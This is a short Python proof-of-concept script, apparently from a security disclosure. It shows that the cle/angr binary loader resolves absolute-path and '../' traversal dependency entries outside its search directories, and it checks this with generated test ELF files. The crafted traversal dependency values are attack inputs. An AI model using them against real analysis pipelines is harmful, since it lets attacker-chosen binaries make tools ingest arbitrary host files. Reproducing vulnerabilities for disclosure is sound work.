#!/usr/bin/env python3
"""PoC 2 - path-like DT_NEEDED entries escape the library search dirs (sink S2).

Two dependency specs that are paths rather than library names:
  - absolute:  os.path.join(libdir, spec) discards libdir entirely
  - traversal: './sub/../dep_rel.so' resolves out of the '.' search directory

Loaded with auto_load_libs=True. Every released cle defaults this flag to True
(the flip to False, commit ce6d0c4, is unreleased), so plain angr.Project(path)
is affected on release versions; we pass it explicitly so the PoC also runs on
HEAD.

Expected on vulnerable cle: both host files ingested as dependency objects.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import cle  # noqa: E402

from lib.builders import build_dyn_exe, build_victim_elf  # noqa: E402


def main():
    print(f"cle {cle.__version__}, {__file__.split('/')[-1]}")
    cwd = os.getcwd()
    with tempfile.TemporaryDirectory() as td:
        try:
            os.chdir(td)  # the '.' search directory must be `td` for the traversal spec
            dep_abs = build_victim_elf(os.path.join(td, "dep_abs.so"))
            dep_rel = build_victim_elf(os.path.join(td, "dep_rel.so"))
            exe = build_dyn_exe([dep_abs, "./sub/../dep_rel.so"], os.path.join(td, "main.elf"))

            ld = cle.Loader(exe, auto_load_libs=True)
            loaded = {os.path.realpath(str(o.binary)) for o in ld.all_objects if o.binary}
            hit_abs = os.path.realpath(dep_abs) in loaded
            hit_rel = os.path.realpath(dep_rel) in loaded
            print(f"  absolute DT_NEEDED ingested: {hit_abs} ({dep_abs})")
            print(f"  traversal DT_NEEDED ingested: {hit_rel} ({dep_rel})")
            print("RESULT:", "VULNERABLE - path-like dependency names ingest arbitrary host files"
                  if hit_abs and hit_rel else "NOT REPRODUCIBLE")
        finally:
            os.chdir(cwd)


if __name__ == "__main__":
    main()
